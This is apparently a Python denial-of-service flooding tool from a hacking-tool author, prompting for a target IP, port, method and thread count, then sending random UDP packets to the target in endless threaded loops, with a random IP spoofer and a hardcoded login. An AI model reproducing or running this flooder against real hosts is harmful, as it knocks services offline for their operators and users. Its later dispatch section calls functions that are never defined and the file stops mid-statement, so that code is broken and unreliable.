#TOOL BY DEAXS
import os
import codecs
import sys
import random
import threading
import time
import socket
from time import time as tt

os.system("clear")


print("""
\033[0;32m _                         
\033[0;32m( )                _       
\033[0;32m| |      _     __ (_) ___  
\033[0;32m| |  _ / _ \ / _  \ |  _  \\
\033[0;32m| |_( ) (_) ) (_) | | ( ) |
\033[0;32m(____/ \___/ \__  |_)_) (_)
\033[0;32m            ( )_) |        
\033[0;32m             \___/         
""")

username = str(input("Username:"))
password = str(input("Password:"))
if password == "DerZPrivate" and username == "DerZPrivate":
    print ("Telah Masuk Sebagai DeaXs")
    time.sleep(0.2)

else:
    print ("Passwordnya Salah Bruh.")
    time.sleep(999999999999999999999999999)
    
os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.5)


nicknm = "DeaXS"

mt = """\033[96mUnder \033[0;93mmaintance"""

os.system("clear")

print("""\033[95m

██████╗░███████╗░█████╗░██╗░░██╗░██████╗
██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝██╔════╝
██║░░██║█████╗░░███████║░╚███╔╝░╚█████╗░
██║░░██║██╔══╝░░██╔══██║░██╔██╗░░╚═══██╗
██████╔╝███████╗██║░░██║██╔╝╚██╗██████╔╝
╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░""")

print("\033[95m>> CODED : DerZ. ") 
print("\033[95m>>> Coded Campuran By : DerZ") 
print("\033[95m>>>> TOOLS PRIVATE DERZ")
print("\033[91m                                       METODE: UDP-TCP-GET-OVH              ")
ip = str(input("  \033[0;31mIP:"))
port = int(input(" \033[0;32mPort:"))
choice = str(input(" \033[94mMethods: "))
times = int(input(" \033[0;31mPacket:"))
threads = int(input(" \033[0;32mThreads:"))
os.system("clear")
time.sleep(0.1)

def dz():
	data = random._urandom(818)
	i = random.choice(("[2]","[1]","[3]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
			   s.sendto(data,addr)
			print(i +"\033[91mAttack To (ip) Port (port)!!!")
		except:
			s.close()
			print("\033[91m EROR \033[91m KONTOL")
			
def dz2():
	data = random._urandom(1024)
	i = random.choice(("[2]","[1]","[3]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91mAttack To (ip) Port (port)!!!")
		except:
			s.close()
			print("\033[91m EROR \033[91m KONTOL")
			
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = dz)
		th.start()
		
		th = threading.Thread(target = dz2)
		th.start()
else:
		th = threading.Thread(target = dz2)
		th.start()
	
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'udp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'TCP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	if choice == 'tcp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	if choice == 'GET':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'get':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'OVH':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'ovh':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
else:
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)